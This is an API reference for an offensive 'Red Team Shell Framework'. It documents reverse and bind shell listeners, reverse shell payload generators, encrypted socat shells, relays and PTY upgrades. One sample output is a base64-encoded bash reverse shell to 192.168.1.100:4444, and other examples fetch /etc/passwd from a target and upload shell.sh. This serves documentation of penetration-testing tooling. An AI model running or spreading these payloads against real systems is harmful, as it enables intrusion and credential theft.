# 📚 API Reference

Complete API reference for all Red Team Shell Framework modules.

---

## Table of Contents

1. [Core Framework](#core-framework)
2. [Listeners Module](#listeners-module)
3. [Shells Module](#shells-module)
4. [Encryption Module](#encryption-module)
5. [Transfer Module](#transfer-module)
6. [Relay Module](#relay-module)
7. [Upgrade Module](#upgrade-module)
8. [Logger Module](#logger-module)

---

## Core Framework

### Framework Functions

#### `display_menu()`
Displays the main CLI menu.

**Syntax:**
```bash
display_menu
```

**Example:**
```bash
$ display_menu
```

---

#### `load_module(module_name)`
Loads a framework module.

**Syntax:**
```bash
load_module "module_name"
```

**Parameters:**
- `module_name` (string): Name of module to load

**Example:**
```bash
load_module "listeners"
load_module "shells"
```

---

## Listeners Module

Location: `modules/listeners.sh`

### Functions

#### `create_reverse_listener(port, log_file, rlwrap_enabled)`
Creates a reverse shell listener.

**Syntax:**
```bash
create_reverse_listener [port] [log_file] [rlwrap_enabled]
```

**Parameters:**
- `port` (int, required): Port to listen on
- `log_file` (string, optional): Path to log file
- `rlwrap_enabled` (bool, optional): Enable rlwrap history (true/false)

**Returns:**
- 0 on success
- 1 on error

**Example:**
```bash
source modules/listeners.sh
create_reverse_listener 4444 logs/session.log true
```

**Output:**
```
[*] Listening on port 4444...
[+] New connection from 192.168.1.100!
```

---

#### `create_bind_listener(port, log_file, command)`
Creates a bind shell listener.

**Syntax:**
```bash
create_bind_listener [port] [log_file] [command]
```

**Parameters:**
- `port` (int, required): Port to listen on
- `log_file` (string, optional): Path to log file
- `command` (string, optional): Command to execute

**Returns:**
- 0 on success
- 1 on error

**Example:**
```bash
source modules/listeners.sh
create_bind_listener 4445 logs/bind.log /bin/bash
```

---

## Shells Module

Location: `modules/shells.sh`

### Functions

#### `generate_bash_payload(ip, port, format)`
Generates a bash reverse shell payload.

**Syntax:**
```bash
generate_bash_payload [ip] [port] [format]
```

**Parameters:**
- `ip` (string, required): Target IP address
- `port` (int, required): Target port
- `format` (string, optional): Output format (plain, base64, url)

**Returns:**
- Payload string

**Example:**
```bash
source modules/shells.sh
PAYLOAD=$(generate_bash_payload "192.168.1.100" 4444 "base64")
echo $PAYLOAD
```

**Output:**
```
YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAwLzQ0NDQgMD4mMQ==
```

---

#### `generate_powershell_payload(ip, port, format)`
Generates a PowerShell reverse shell payload.

**Syntax:**
```bash
generate_powershell_payload [ip] [port] [format]
```

**Parameters:**
- `ip` (string, required): Target IP address
- `port` (int, required): Target port
- `format` (string, optional): Output format (plain, base64, url)

**Returns:**
- Payload string

**Example:**
```bash
source modules/shells.sh
PAYLOAD=$(generate_powershell_payload "192.168.1.100" 4444 "base64")
```

---

#### `generate_python_payload(ip, port, format)`
Generates a Python reverse shell payload.

**Syntax:**
```bash
generate_python_payload [ip] [port] [format]
```

**Parameters:**
- `ip` (string, required): Target IP address
- `port` (int, required): Target port
- `format` (string, optional): Output format (plain, base64, url)

**Returns:**
- Payload string

---

## Encryption Module

Location: `modules/encrypt.sh`

### Functions

#### `create_socat_ssl_listener(port, cert_file, key_file, command)`
Creates an SSL-encrypted listener using socat.

**Syntax:**
```bash
create_socat_ssl_listener [port] [cert_file] [key_file] [command]
```

**Parameters:**
- `port` (int, required): Port to listen on
- `cert_file` (string, required): Certificate file path
- `key_file` (string, required): Private key file path
- `command` (string, optional): Command to execute

**Returns:**
- 0 on success
- 1 on error

**Example:**
```bash
source modules/encrypt.sh
create_socat_ssl_listener 4444 certs/cert.pem certs/key.pem /bin/bash
```

---

#### `generate_self_signed_cert(output_cert, output_key, days, bits)`
Generates a self-signed certificate.

**Syntax:**
```bash
generate_self_signed_cert [output_cert] [output_key] [days] [bits]
```

**Parameters:**
- `output_cert` (string, required): Output certificate file path
- `output_key` (string, required): Output key file path
- `days` (int, optional): Certificate validity in days (default: 365)
- `bits` (int, optional): RSA key size (default: 2048)

**Returns:**
- 0 on success
- 1 on error

**Example:**
```bash
source modules/encrypt.sh
generate_self_signed_cert certs/cert.pem certs/key.pem 365 4096
```

---

## Transfer Module

Location: `modules/transfer.sh`

### Functions

#### `secure_download(remote_host, remote_path, local_path, username)`
Downloads a file securely using SCP.

**Syntax:**
```bash
secure_download [remote_host] [remote_path] [local_path] [username]
```

**Parameters:**
- `remote_host` (string, required): Remote host IP/hostname
- `remote_path` (string, required): File path on remote system
- `local_path` (string, required): Local destination path
- `username` (string, required): Username for SSH

**Returns:**
- 0 on success
- 1 on error

**Example:**
```bash
source modules/transfer.sh
secure_download 192.168.1.100 /etc/passwd ./passwd.txt root
```

---

#### `secure_upload(local_path, remote_host, remote_path, username)`
Uploads a file securely using SCP.

**Syntax:**
```bash
secure_upload [local_path] [remote_host] [remote_path] [username]
```

**Parameters:**
- `local_path` (string, required): Local file path
- `remote_host` (string, required): Remote host IP/hostname
- `remote_path` (string, required): Destination path on remote
- `username` (string, required): Username for SSH

**Returns:**
- 0 on success
- 1 on error

**Example:**
```bash
source modules/transfer.sh
secure_upload ./shell.sh 192.168.1.100 /tmp/shell.sh root
```

---

#### `verify_checksum(file_path, expected_hash, algorithm)`
Verifies file integrity using checksum.

**Syntax:**
```bash
verify_checksum [file_path] [expected_hash] [algorithm]
```

**Parameters:**
- `file_path` (string, required): Path to file
- `expected_hash` (string, required): Expected hash value
- `algorithm` (string, optional): Algorithm (sha256, md5, sha1)

**Returns:**
- 0 if match
- 1 if mismatch

**Example:**
```bash
source modules/transfer.sh
verify_checksum ./payload.sh "abc123def456" "sha256"
```

---

## Relay Module

Location: `modules/relay.sh`

### Functions

#### `create_relay(listen_port, forward_host, forward_port)`
Creates a relay to forward connections.

**Syntax:**
```bash
create_relay [listen_port] [forward_host] [forward_port]
```

**Parameters:**
- `listen_port` (int, required): Port to listen on locally
- `forward_host` (string, required): Host to forward to
- `forward_port` (int, required): Port to forward to

**Returns:**
- 0 on success
- 1 on error

**Example:**
```bash
source modules/relay.sh
create_relay 5555 192.168.2.100 4444
```

---

## Upgrade Module

Location: `modules/upgrade.sh`

### Functions

#### `upgrade_to_pty(shell_path, user)`
Upgrades shell to full interactive PTY.

**Syntax:**
```bash
upgrade_to_pty [shell_path] [user]
```

**Parameters:**
- `shell_path` (string, optional): Shell binary path
- `user` (string, optional): User to run as

**Returns:**
- 0 on success
- 1 on error

**Example:**
```bash
source modules/upgrade.sh
upgrade_to_pty /bin/bash root
```

---

## Logger Module

Location: `modules/logger.sh`

### Functions

#### `log_session(action, status, details)`
Logs a session action in JSON format.

**Syntax:**
```bash
log_session [action] [status] [details]
```

**Parameters:**
- `action` (string, required): Action type
- `status` (string, required): Status (success/failure/warning)
- `details` (JSON, optional): Additional details

**Returns:**
- 0 on success

**Example:**
```bash
source modules/logger.sh
log_session "listener_created" "success" '{"port": 4444, "type": "reverse"}'
```

**Output:**
```json
{"timestamp": "2026-02-25T10:30:45Z", "action": "listener_created", "status": "success", ...}
```

---

## Utility Functions

### Common Utility Functions

#### `color_green(message)`
Outputs message in green.

**Syntax:**
```bash
color_green "Success message"
```

---

#### `color_red(message)`
Outputs message in red.

**Syntax:**
```bash
color_red "Error message"
```

---

#### `color_yellow(message)`
Outputs message in yellow.

**Syntax:**
```bash
color_yellow "Warning message"
```

---

## Return Codes

All functions follow standard return codes:

- `0` - Success
- `1` - General error
- `2` - Misuse of command
- `126` - Command cannot execute
- `127` - Command not found
- `128+N` - Fatal error signal N

---

## Configuration Variables

### Global Variables

```bash
FRAMEWORK_DIR      # Framework root directory
MODULES_DIR        # Modules directory
LOGS_DIR           # Logs directory
CERTS_DIR          # Certificates directory
PAYLOADS_DIR       # Payloads directory
SESSION_ID         # Current session ID
LOG_FILE           # Main log file path
VERSION            # Framework version
```

---

## Error Handling

All functions provide error messages to STDERR:

```bash
function example() {
    if [[ $# -lt 2 ]]; then
        echo "ERROR: Missing required arguments" >&2
        return 1
    fi
}
```

---

## Version

- **API Version**: 1.0.0
- **Framework Version**: 1.0.0
- **Last Updated**: 2026-02-25

---

**For more information, see the module source files in the `modules/` directory.**

---
